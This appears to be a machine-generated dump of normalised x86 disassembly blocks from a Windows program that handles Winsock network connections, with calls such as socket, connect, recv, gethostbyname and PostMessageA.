push r--data
mov ecx edi
call sub_402010
lea edx [ esp + 0x12c ]
push edx
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov ecx edi
call sub_402010
lea ecx [ esp + 0x12c ]
push ecx
jmp r-xdata
push r--data
mov ecx edi
call sub_402010
lea edx [ esp + 0x2c ]
push edx
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov ecx edi
call sub_402010
mov ecx [ rw-data ]
mov edx [ esi + 0xb4 ]
push ecx
push edx
lea eax [ esp + 0x34 ]
push r--data
push eax
call ebx
add esp 0x10
lea ecx [ esp + 0x2c ]
push ecx
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov ecx edi
call sub_402010
lea edx [ esp + 0x2c ]
push edx
jmp r-xdata
push r--data
mov ecx [ esi + 0x4c ]
mov [ esi + 0x54 ] eax
mov eax [ esi + 0x48 ]
mov [ esi + 0x58 ] eax
mov [ esi + 0x5c ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x31c
retn
dec ebx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx edi
call sub_401cc0
lea eax [ ebx + 0x4 ]
cmp eax 0x3
ja r-xdata
mov ecx edi
call sub_402010
mov ecx edi
call sub_402010
lea eax [ esp + 0x2c ]
push eax
mov esi [ esp + 0x20 ]
cmp esi 0xc8
jae r-xdata
jmp [ eax * 4 + jump_table_4af324 ]
cmp esi 0x12c
jae r-xdata
push r--data
jmp r-xdata
push r--data
mov ecx edi
call sub_402010
mov ecx [ esi + 0xa8 ]
push edi
push ecx
call sub_4ae740
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x31c
retn
push r--data
mov ecx edi
call sub_402010
mov edx [ esi + 0xa8 ]
push edi
push edx
call sub_4ae000
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x31c
retn
push r--data
mov ecx edi
call sub_402010
pop edi
pop esi
pop ebp
pop ebx
add esp 0x31c
retn
push r--data
mov ecx edi
call sub_402010
pop edi
pop esi
pop ebp
pop ebx
add esp 0x31c
retn
cmp esi 0x190
jae r-xdata
push r--data
jmp r-xdata
mov ecx edi
call sub_402010
cmp esi 0x1f4
jae r-xdata
push r--data
jmp r-xdata
cmp esi 0x258
jae r-xdata
push r--data
jmp r-xdata
push edi
push esi
call sub_4ae7a0
add esp 0x8
push r--data
sub_4af340
push 0xffffffff
push sub_4c1f98
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push ebp
push esi
push edi
mov ecx rw-data
mov [ esp + 0x10 ] rw-data
call sub_404310
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
mov [ esp + 0x48 ] ebx
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x40 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x3c
retn
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
cmp ecx ebx
je r-xdata
xor esi esi
xor ebp ebp
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] ebp
mov [ esp + 0x20 ] ebx
mov [ esp + 0x48 ] 0x1
xor edi edi
jmp r-xdata
cmp eax ebx
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov edi [ PeekMessageA@IAT ]
mov ecx [ eax + edi * 4 ]
cmp [ ecx + 0xb0 ] ebx
je r-xdata
cmp edi ecx
jge r-xdata
mov ecx ebp
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
inc edi
jmp r-xdata
xor edx edx
lea esp [ esp ]
xor esi esi
xor ebp ebp
xor edi edi
mov [ esp + 0x28 ] ebp
mov [ esp + 0x2c ] edi
mov [ esp + 0x30 ] esi
mov ebx [ shutdown@IAT ]
mov [ esp + 0x48 ] 0x2
lea esp [ esp ]
mov eax [ esi ]
push 0x1
push 0x1703
push 0x1700
push eax
lea ecx [ esp + 0x34 ]
push ecx
call edi
test eax eax
jne r-xdata
cmp ebx ecx
jge r-xdata
mov ecx ebp
sub ecx esi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
inc ebx
add esi 0x4
jmp r-xdata
xor ebx ebx
cmp esi ebx
jne r-xdata
mov ecx [ eax + edi * 4 ]
mov ebx [ esi + edx * 4 ]
cmp ebx [ ecx + 0xb0 ]
je r-xdata
cmp edx ecx
jge r-xdata
test ebp ebp
je r-xdata
mov edx [ eax + esi * 4 ]
mov ecx [ edx + 0xac ]
test ecx ecx
je r-xdata
cmp esi ecx
jge r-xdata
mov edx [ esp + 0x18 ]
test edx edx
jne r-xdata
mov ecx ebp
sub ecx esi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
inc edx
jmp r-xdata
mov ebp [ LocalFree@IAT ]
xor ebx ebx
xor edi edi
lea esp [ esp ]
sub edi ebp
sar edi 0x2
test edi edi
jbe r-xdata
inc esi
jmp r-xdata
mov eax edx
add eax 0xac
test ebp ebp
je r-xdata
mov edx [ eax + edi * 4 ]
mov [ edx + 0xb0 ] ebx
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0xb0
cmp esi ebx
je r-xdata
cmp edx ecx
jne r-xdata
test esi esi
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
call [ GetCurrentThreadId@IAT ]
mov ebx [ rw-data ]
mov edx [ rw-data ]
xor esi esi
test eax eax
jne r-xdata
push eax
push 0x1
push ecx
mov eax esp
lea ecx [ esp + 0x30 ]
mov [ eax ] edi
call sub_42c680
mov edi [ esp + 0x2c ]
mov ebp [ esp + 0x28 ]
mov edx [ esp + 0x30 ]
mov ecx edi
sub ecx ebp
sub edx ebp
sar ecx 0x2
sar edx 0x2
cmp ecx edx
jae r-xdata
push eax
push 0x1
push ecx
mov eax esp
lea ecx [ esp + 0x20 ]
mov [ eax ] ebp
call sub_453480
mov ebp [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
mov ecx ebp
sub ecx esi
sub edx esi
sar ecx 0x2
sar edx 0x2
cmp ecx edx
jae r-xdata
cmp eax ebx
je r-xdata
mov ecx [ eax + edi * 4 ]
mov ecx [ ecx + 0xd4 ]
cmp ecx ebx
je r-xdata
cmp edi ecx
jge r-xdata
mov ecx ebx
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
push 0x2
push ecx
call ebx
mov eax [ rw-data ]
mov ecx [ eax + esi * 4 ]
mov edx [ ecx + 0x28 ]
cmp edx 0x3
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
push eax
push 0x1
push edi
call sub_420d80
add esp 0x14
add edi 0x4
mov [ esp + 0x2c ] edi
jmp r-xdata
mov edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x18 ]
push ecx
push eax
push 0x1
push ebp
call sub_420d80
add esp 0x14
add ebp 0x4
mov [ esp + 0x1c ] ebp
jmp r-xdata
mov eax [ esp + 0x28 ]
cmp eax ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ eax + edi * 4 ]
mov ecx [ edx + 0xac ]
cmp ecx ebx
je r-xdata
push ecx
call ebp
mov eax [ rw-data ]
xor esi esi
cmp [ edx + esi * 8 ] eax
je r-xdata
cmp esi ecx
jge r-xdata
mov eax [ ecx + 0x4 ]
push eax
call [ closesocket@IAT ]
mov ecx [ rw-data ]
mov edx [ ecx + esi * 4 ]
mov [ edx + 0x4 ] 0xffffffff
mov eax [ rw-data ]
cmp edx 0x2
jne r-xdata
mov eax [ rw-data ]
mov ecx [ eax + esi * 4 ]
mov [ ecx + 0x24 ] 0x3
mov eax [ rw-data ]
mov edx [ eax + esi * 4 ]
mov ecx [ edx + 0x4 ]
cmp ecx 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov esi [ eax + edi * 4 ]
cmp esi ebx
je r-xdata
push ecx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push 0xffffffff
push 0x1
push ebp
push edi
call [ WaitForMultipleObjects@IAT ]
test esi esi
jle r-xdata
mov ebx esi
jmp r-xdata
mov esi [ edx + esi * 8 + 0x4 ]
jmp r-xdata
inc esi
jmp r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
inc edi
jmp r-xdata
mov ecx esi
call sub_453080
push esi
call j_sub_4b66ed#2
mov eax [ rw-data ]
add esp 0x4
mov eax [ rw-data ]
lea ecx [ ecx ]
mov ecx rw-data
call sub_401420
dec ebx
jne r-xdata
test esi esi
jle r-xdata
test edx edx
jne r-xdata
cmp eax ebx
jne r-xdata
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
sub_4af730
sub esp 0x190
mov ecx rw-data
call sub_404310
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
add esp 0x190
retn
lea eax [ esp ]
push eax
push 0x2
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
mov ecx rw-data
call sub_401420
xor eax eax
add esp 0x190
retn
sub_4af790
push 0xffffffff
push sub_4c1fb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
mov al [ rw-data ]
test al al
mov [ esp + 0xc ] 0x0
jne r-xdata
call sub_4af340
call [ WSACleanup@IAT ]
mov ecx rw-data
mov [ rw-data ] 0x0
call sub_401420
mov ecx [ esp + 0x4 ]
mov eax 0x1
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx rw-data
call sub_401420
xor eax eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4af820
push 0xffffffff
push sub_4c1fb8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
mov ecx rw-data
push edi
mov [ esp + 0x14 ] ecx
call sub_404310
mov ebp [ rw-data ]
xor edi edi
mov [ esp + 0x20 ] edi
mov eax [ rw-data ]
sub eax ebp
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov edx [ ebp + edi * 4 ]
mov eax [ esp + 0x28 ]
add edx 0x8
lea esi [ eax + 0x1 ]
mov edi edi
cmp edi eax
jge r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ edx + 0x14 ]
sub eax esi
test ebx ebx
je r-xdata
cmp ebx eax
jb r-xdata
cmp ebx eax
mov ecx ebx
jb r-xdata
inc edi
jmp r-xdata
xor edx edx
cmp ebx eax
setne dl
test edx edx
je r-xdata
cmp [ edx + 0x18 ] 0x10
jb r-xdata
mov ecx eax
test ebp ebp
mov [ esp + 0x10 ] edi
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
mov edx [ ebp + edi * 4 ]
push eax
push ecx
push edx
call sub_4aee20
add esp 0xc
add edx 0x4
mov edx [ edx + 0x4 ]
jmp r-xdata
test edx edx
mov edi [ esp + 0x10 ]
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
mov edi [ esp + 0x28 ]
mov esi edx
xor edx edx
[ esi ] [ edi ]
je r-xdata
sub_4af910
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub esp 0x8
push ebx
push ebp
push esi
mov [ eax ] 0x0
mov [ ecx ] 0x0
push edi
mov ecx rw-data
call sub_404310
mov ebp [ esp + 0x1c ]
xor esi esi
mov eax [ rw-data ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov eax [ edi + esi * 4 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x14 ]
add eax 0x8
cmp ecx 0x10
jb r-xdata
cmp esi eax
jge r-xdata
lea ecx [ ebp + 0x4 ]
mov [ esp + 0x14 ] ecx
mov edx [ ebp + 0x4 ]
mov [ esp + 0x14 ] edx
jmp r-xdata
cmp edx ebx
jb r-xdata
cmp edx ebx
mov ecx edx
jb r-xdata
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
inc esi
jmp r-xdata
xor eax eax
cmp edx ebx
setne al
test eax eax
je r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov edi [ rw-data ]
test edi edi
mov [ esp + 0x10 ] esi
jne r-xdata
mov eax [ edi + esi * 4 ]
mov ecx [ eax + 0x28 ]
cmp ecx 0xe
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edx [ eax + 0x88 ]
mov [ ebp + 0x20 ] edx
mov eax [ eax + 0x8c ]
mov [ ebp + 0x24 ] eax
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
lea ecx [ ebp + 0x28 ]
push ecx
add eax 0x90
push eax
call [ SystemTimeToFileTime@IAT ]
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
mov ecx [ eax + 0xcc ]
test ecx ecx
je r-xdata
cmp ecx 0xf
je r-xdata
test eax eax
mov edi [ rw-data ]
mov esi [ esp + 0x10 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov edi [ esp + 0x14 ]
mov esi eax
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov eax [ eax + 0xd4 ]
mov ecx [ esp + 0x20 ]
mov [ ecx ] eax
cmp [ eax + 0xd0 ] 0x10
jb r-xdata
cmp ecx 0xb
je r-xdata
mov edx [ esp + 0x24 ]
add eax 0xbc
mov [ edx ] eax
mov [ ebp + 0x1c ] 0x0
jmp r-xdata
mov eax [ eax + 0xbc ]
mov edx [ esp + 0x24 ]
mov [ edx ] eax
mov [ ebp + 0x1c ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x8
retn
cmp ecx 0xc
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
mov edx [ eax + 0x28 ]
xor ecx ecx
cmp edx 0xe
setne cl
pop edi
pop esi
pop ebp
pop ebx
inc ecx
mov eax ecx
add esp 0x8
retn
cmp ecx 0xd
je r-xdata
cmp ecx 0x1
jne r-xdata
mov cl [ esp + 0x28 ]
test cl cl
je r-xdata
mov [ rw-data ] eax
sub_4afac0
sub esp 0x400
push ebp
mov ebp [ esp + 0x408 ]
cmp [ ebp + 0x4 ] 0xffffffff
je r-xdata
pop ebp
add esp 0x400
retn
mov eax r--data
mov [ ebp + 0x28 ] 0x9
mov [ ebp + 0xa4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push ebx
push esi
push edi
sub eax edx
push eax
lea esi [ ebp + 0xd8 ]
push r--data
mov ecx esi
call sub_401cc0
push 0x0
push esi
push ebp
call sub_4aee20
mov edi [ ebp + 0x4 ]
add esp 0xc
mov ecx rw-data
call sub_401490
mov esi eax
test esi esi
jle r-xdata
push 0x2
push edi
call [ shutdown@IAT ]
test esi esi
jle r-xdata
mov ebx esi
mov ebx [ ebp + 0x4 ]
call [ GetCurrentThreadId@IAT ]
mov edi [ rw-data ]
mov edx [ rw-data ]
xor esi esi
jmp r-xdata
mov ecx rw-data
call sub_401420
dec ebx
jne r-xdata
mov ecx edi
sub ecx edx
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
xor esi esi
jmp r-xdata
cmp [ edx + esi * 8 ] eax
je r-xdata
cmp esi ecx
jge r-xdata
lea ecx [ ecx ]
push 0x0
push 0x400
lea eax [ esp + 0x18 ]
push eax
push ebx
call [ recv@IAT ]
test esi esi
mov edi eax
jle r-xdata
mov esi [ edx + esi * 8 + 0x4 ]
test esi esi
jle r-xdata
inc esi
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
mov edi esi
lea esp [ esp ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0x4 ]
push ecx
call [ closesocket@IAT ]
pop edi
pop esi
mov [ ebp + 0x4 ] 0xffffffff
pop ebx
test edi edi
jne r-xdata
mov ecx rw-data
call sub_401420
dec edi
jne r-xdata
sub_4afc00
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4c1fe6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1b14
call sub_4b6180
push ebx
push esi
mov ecx rw-data
push edi
mov [ esp + 0x160 ] ecx
call sub_404310
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1b2c ] 0x0
mov [ esp + 0x64 ] 0xffffffff
mov [ esp + 0x34 ] eax
mov [ esp + 0x60 ] 0xb
mov [ ebx + 0xb4 ] 0x0
mov eax [ rw-data ]
test eax eax
jl r-xdata
mov eax [ esp + 0x64 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x34 ]
cmp ecx [ ebx + 0x24 ]
mov esi 0xa
jne r-xdata
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0xa8 ]
push ebx
mov [ esp + 0x34 ] edx
mov [ esp + 0x3c ] eax
call sub_4afac0
mov eax [ ebx + 0x24 ]
mov ecx [ esp + 0x38 ]
add esp 0x4
cmp ecx eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
push ebx
call sub_4afac0
mov eax [ ebx + 0xb4 ]
add esp 0x4
test eax eax
jle r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
cmp eax 0x3
mov [ esp + 0x34 ] eax
jne r-xdata
cmp [ ebx + 0x4 ] 0xffffffff
jne r-xdata
call [ GetTickCount@IAT ]
cmp [ ebx + 0x28 ] esi
je r-xdata
mov eax [ esp + 0x60 ]
cmp eax 0xb
mov [ ebx + 0x28 ] eax
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov [ esp + 0x13 ] 0x0
jmp r-xdata
mov [ esp + 0x60 ] 0xc
mov al [ esp + 0x13 ]
xor esi esi
test al al
mov [ ebx + 0xa4 ] esi
mov [ ebx + 0xa8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ecx ecx
xor edi edi
cmp eax ecx
mov [ esp + 0x18 ] ecx
je r-xdata
mov esi [ ebx + 0xa0 ]
mov edx eax
sub edx esi
cmp edx 0x1388
jae r-xdata
mov cl [ esp + 0x13 ]
test cl cl
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov [ ebx + 0x24 ] 0x3
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
call sub_401cc0
mov eax r--data
lea esi [ eax + 0x1 ]
cmp [ ebx + 0x20 ] 0x10
jb r-xdata
lea ecx [ esp + 0x520 ]
push ecx
lea eax [ esp + 0x724 ]
jmp r-xdata
mov esi [ rw-data ]
mov [ esp + 0x14 ] ecx
mov edi [ eax + 0x100 ]
mov [ ebx + 0xa0 ] eax
mov ecx rw-data
call sub_401490
mov esi eax
test esi esi
jle r-xdata
mov eax r--data
mov [ ebx + 0x28 ] esi
mov [ ebx + 0xa4 ] 0x0
lea edx [ eax + 0x1 ]
mov edi edi
mov [ ebx + 0xa0 ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea esi [ ebx + 0xd8 ]
push r--data
mov ecx esi
call sub_401cc0
push 0x0
push esi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push r--data
mov ecx edi
call sub_401cc0
lea eax [ esp + 0x720 ]
lea edx [ eax + 0x1 ]
lea eax [ ebx + 0xc ]
mov eax [ ebx + 0xc ]
jmp r-xdata
lea edi [ esp + 0x324 ]
call sub_4addb0
add esp 0x4
cmp eax 0xffffffff
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ rw-data ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
test esi esi
jle r-xdata
mov edi esi
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
call sub_401cc0
push 0x0
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x724 ]
push ecx
mov ecx edi
call sub_401cc0
jmp r-xdata
mov eax r--data
mov [ ebx + 0xa4 ] 0xfffffffd
lea edx [ eax + 0x1 ]
cmp [ rw-data ] esi
jne r-xdata
lea edx [ esp + 0x520 ]
push edx
mov edx [ esp + 0x18 ]
cmp edx [ rw-data ]
jl r-xdata
mov eax [ esi + ecx * 4 ]
cmp eax ebx
je r-xdata
cmp ecx eax
jge r-xdata
mov edx [ ebx + 0xb4 ]
cmp edx [ rw-data ]
jle r-xdata
lea ecx [ ecx ]
mov ecx rw-data
call sub_401420
dec edi
jne r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401cc0
mov eax r--data
lea edi [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
call sub_401cc0
push esi
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
cmp eax esi
je r-xdata
mov al [ rw-data ]
xor edi edi
test al al
je r-xdata
mov esi [ esp + 0x14 ]
lea edi [ esp + 0x320 ]
mov [ esp + 0x24 ] esi
jmp r-xdata
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ ebx + 0x4 ] eax
je r-xdata
cmp [ ebx + 0x28 ] 0x1
je r-xdata
mov ecx [ esp + 0x14 ]
inc ecx
mov [ esp + 0x14 ] ecx
jmp r-xdata
cmp [ eax + 0x4 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push r--data
mov ecx esi
call sub_401cc0
call [ GetTickCount@IAT ]
sub eax [ ebx + 0xa0 ]
mov [ ebx + 0xf4 ] eax
cmp [ esp + 0x60 ] 0xb
jne r-xdata
push ebx
push esi
push 0x1700
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
lea eax [ edi + 0x1 ]
push eax
push rw-data
lea ecx [ esp + 0x928 ]
push ecx
call [ lstrcpynA@IAT ]
cmp [ edi + rw-data ] 0x3a
mov esi 0x1f90
mov [ esp + 0x24 ] esi
jne r-xdata
lea ebx [ ebx ]
mov ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0xf8 ]
push r--data
push edx
mov [ esp + 0x44 ] edi
call [ wsprintfA@IAT ]
add esp 0xc
push edi
call [ inet_addr@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x20 ] eax
jne r-xdata
mov [ ebx + 0xa4 ] 0xfffffffe
call [ WSAGetLastError@IAT ]
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
mov [ ebx + 0xa8 ] eax
call sub_402010
push 0x0
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov al [ esp + 0x13 ]
test al al
jne r-xdata
push rw-data
lea ecx [ esp + 0x15c ]
call sub_4014e0
push 0xa
call [ Sleep@IAT ]
lea ecx [ esp + 0x158 ]
call sub_404410
jmp r-xdata
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
mov [ ebx + 0x28 ] 0x1
call sub_402010
push 0x0
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
test esi esi
jne r-xdata
inc [ esp + 0x18 ]
cmp [ eax + 0x28 ] 0x1
jne r-xdata
mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x38 ]
mov [ ebx + 0xa4 ] edx
mov [ ebx + 0xa8 ] eax
cmp [ ebx + 0x20 ] 0x10
jb r-xdata
lea edx [ edi + rw-data ]
push edx
call j_sub_4b692d
mov esi eax
add esp 0x4
mov [ esp + 0x24 ] esi
mov al [ edi + rw-data ]
inc edi
test al al
jne r-xdata
mov edx [ esp + 0x20 ]
push esi
mov [ esp + 0xdc ] 0x2
mov [ esp + 0xe0 ] edx
call [ htons@IAT ]
mov [ esp + 0xda ] ax
xor eax eax
mov [ esp + 0xe0 ] eax
mov [ esp + 0xe4 ] eax
mov eax r--data
mov [ ebx + 0x28 ] 0x3
lea edi [ eax + 0x1 ]
mov eax r--data
mov [ ebx + 0x28 ] 0x2
lea edx [ eax + 0x1 ]
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
mov eax [ esp + 0x34 ]
cmp eax [ ebx + 0x24 ]
jne r-xdata
call [ GetTickCount@IAT ]
mov [ ebx + 0xa0 ] eax
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
cmp ebx [ rw-data ]
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x1b24 ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push 0x0
push 0x1703
push eax
call [ PostMessageA@IAT ]
lea eax [ ebx + 0xc ]
mov eax [ ebx + 0xc ]
jmp r-xdata
cmp al 0x3a
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
call sub_401cc0
push 0x0
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edi [ ebx + 0xd8 ]
push r--data
mov ecx edi
call sub_401cc0
push 0x0
push edi
push ebx
call sub_4aee20
mov eax [ ebx + 0xb0 ]
add esp 0xc
test eax eax
je r-xdata
mov ecx [ eax + 0x100 ]
mov edx [ ebx + 0x100 ]
cmp edx ecx
jle r-xdata
push eax
lea eax [ esp + 0x524 ]
push eax
call [ lstrcpyA@IAT ]
lea edi [ esp + 0x920 ]
movzx ecx [ esp + 0x23 ]
movzx edx [ esp + 0x22 ]
mov eax [ esp + 0x20 ]
push esi
push ecx
push edx
movzx ecx ah
movzx edx al
push ecx
push edx
lea eax [ esp + 0x194 ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x19c ]
add esp 0x1c
lea edx [ eax + 0x1 ]
jmp r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
mov ecx rw-data
call sub_401490
mov esi eax
test esi esi
jle r-xdata
push ebx
push 0x0
push 0x1700
push eax
call [ PostMessageA@IAT ]
jge r-xdata
cmp edx edi
jle r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
call [ gethostbyname@IAT ]
test esi esi
mov [ esp + 0x30 ] eax
jle r-xdata
mov [ esp + 0x30 ] esi
jmp r-xdata
mov ecx [ ebx + 0xfc ]
cmp ecx [ eax + 0xfc ]
jle r-xdata
cmp ecx edi
jle r-xdata
cmp ecx edi
jl r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x184 ]
push ecx
lea ecx [ ebx + 0xd8 ]
call sub_401cc0
mov esi [ ebx + 0x4 ]
mov ecx rw-data
call sub_401490
mov edi eax
test edi edi
jle r-xdata
mov ecx [ esp + 0x34 ]
cmp ecx [ ebx + 0x24 ]
jne r-xdata
mov ecx rw-data
call sub_404310
dec esi
jne r-xdata
mov ecx rw-data
call sub_401420
dec [ esp + 0x30 ]
jne r-xdata
cmp edx edi
jge r-xdata
jmp r-xdata
push 0x10
lea edx [ esp + 0xdc ]
push edx
push esi
call [ connect@IAT ]
test edi edi
mov esi eax
jle r-xdata
mov [ esp + 0x30 ] edi
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
jmp r-xdata
cmp esi 0xffffffff
jne r-xdata
jmp r-xdata
mov ecx rw-data
call sub_401420
dec [ esp + 0x30 ]
jne r-xdata
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov ecx [ eax ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x20 ] ecx
mov [ ebx + 0xa4 ] 0xfffffffe
call [ WSAGetLastError@IAT ]
mov [ ebx + 0xa8 ] eax
mov eax r--data
